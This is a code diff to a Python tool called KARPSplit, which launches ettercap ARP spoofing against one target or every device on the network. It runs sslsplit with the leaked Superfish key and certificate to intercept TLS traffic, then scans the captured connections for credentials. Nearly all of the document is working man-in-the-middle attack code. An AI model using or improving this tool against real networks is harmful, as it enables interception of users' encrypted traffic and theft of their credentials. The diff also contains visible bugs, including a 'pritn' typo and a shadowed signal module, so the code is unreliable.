@@ -4,6 +4,7 @@ import re
 import time
 import sys
 import os
+import signal
 
 
 def arpspoof(target = None):
@@ -11,20 +12,19 @@ def arpspoof(target = None):
     gateway = gws['default'][netifaces.AF_INET][0]
     print("Using gateway " + gateway)
     if target is None:
-        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "///", "/"+gateway+"//"], stdout=PIPE)
+        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "///", "/"+gateway+"//"], stdout=DEVNULL, stderr=PIPE)
     else:
-        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "/"+target+"//", "/"+gateway+"//"], stdout=PIPE)
+        spoofer = Popen(["ettercap", "-T", "-M", "ARP", "-S", "-o", "/"+target+"//", "/"+gateway+"//"], stdout=DEVNULL, stderr=PIPE)
     while 1:
-        line = spoofer.stdout.readline()
+        line = spoofer.stderr.readline()
         if line:
-            if "(press 'q' to exit)" in line:
-                print("Activated mitm attack...")
+            if line.find(b"(press 'q' to exit)"):
+                print("ARP Spoofing active")
                 break
-            print(line)
 
 
 def sslsplit():
-    splitter = Popen(["sslsplit", "-k", "/root/superfishy-master/certificates/superfish-unprotected.key", "-c", "/root/superfishy-master/certificates/superfish.crt", "-L", "/root/sslsplit/connections.txt", "ssl", "0.0.0.0", "8443"], stdout=DEVNULL, stderr=DEVNULL)
+    splitter = Popen(["sslsplit", "-k", "/root/superfishy-master/certificates/superfish-unprotected.key", "-c", "/root/superfishy-master/certificates/superfish.crt", "-L", "/root/sslsplit/connections.txt", "ssl", "0.0.0.0", "8443"], stdin=PIPE, universal_newlines=True, stdout=DEVNULL, stderr=DEVNULL)
     return splitter
 
 
@@ -56,21 +56,30 @@ def read_output():
                         print(deet[0] + ": " + deet[1])
                     # print a new line
                     print()
-            time.sleep(2)
 
+
+def handle_sigint(signal, frame):
+    global spoofer, splitter
+    print("Stopping ARP Spoofer...")
+    spoofer.send_signal(signal.SIGINT)
+    spoofer.wait(5)
+    pritn("Exiting SSLSplit...")
+    splitter.stdin.write("q")
+    splitter.wait(5)
+
+
+signal.signal(signal.SIGINT, handle_sigint)
 
 print("\nKARPSplit v0.1\n")
 
 if len(sys.argv) > 1:
     print("Starting ARP Spoof on " + sys.argv[1] + "... ")
-    arpspoof(sys.argv[1])
+    spoofer = arpspoof(sys.argv[1])
 else:
     print("Starting ARP Spoof on all devices... ")
-    arpspoof()
-print("Starting SSLSplit... ", end="")
+    spoofer = arpspoof()
+print("Starting SSLSplit... ")
 splitter = sslsplit()
-time.sleep(1)
 print("Starting credential scanner...")
 read_output()
-time.sleep(40000)
 
